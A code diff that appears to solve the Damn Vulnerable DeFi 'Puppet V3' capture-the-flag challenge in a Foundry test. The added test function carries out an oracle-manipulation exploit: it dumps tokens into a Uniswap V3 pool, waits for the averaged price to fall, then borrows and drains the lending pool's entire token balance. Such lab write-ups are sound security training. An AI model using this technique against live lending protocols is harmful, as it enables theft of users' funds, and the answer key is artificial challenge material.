@@ -11,6 +11,8 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
 
+import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
+
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -119,8 +121,54 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        // STEP 1: Manipulate the tick range for a favorable price
+        // Swap all the player's DVT balance to push the tick out of the current range.
+        // This will result in a tick value of -887,272.
+        // The PuppetV3Pool uses OracleLibrary::consult() to retrieve the `arithmeticMeanTick`,
+        // making DVT very cheap when swapped for WETH in the lending pool.
+        // Transfer the WETH obtained from the swap to the recovery account to only use
+        // PLAYER_INITIAL_ETH_BALANCE during the borrowing step.
+        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+
+        token.approve(address(swapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        swapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: 3000,
+                recipient: player,
+                deadline: block.timestamp + 15,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        weth.transfer(recovery, weth.balanceOf(player));
+
+        // STEP 2: Oracle manipulation to adjust the price
+        // OracleLibrary::consult() returns a tick value proportional to the number of seconds,
+        // specifically (−887,272 × seconds).
+        // PuppetV3Pool::_getOracleQuote() will use this tick in OracleLibrary::getQuoteAtTick()
+        // to compute the price.
+        // Then PuppetV3Pool::calculateDepositOfWETHRequired() multiplies the price by
+        // DEPOSIT_FACTOR = 3 to determine the required WETH deposit.
+        // The goal is to minimize the number of seconds needed to trade 1M DVT for 1 WETH.
+        skip(101 seconds);
+
+        // STEP 3: Borrow the tokens and finalize the exploit
+        // Perform the borrow operation using the initial assigned ETH balance.
+        // Transfer the borrowed tokens to the recovery account.
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        weth.approve(
+            address(lendingPool),
+            lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
+        );
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
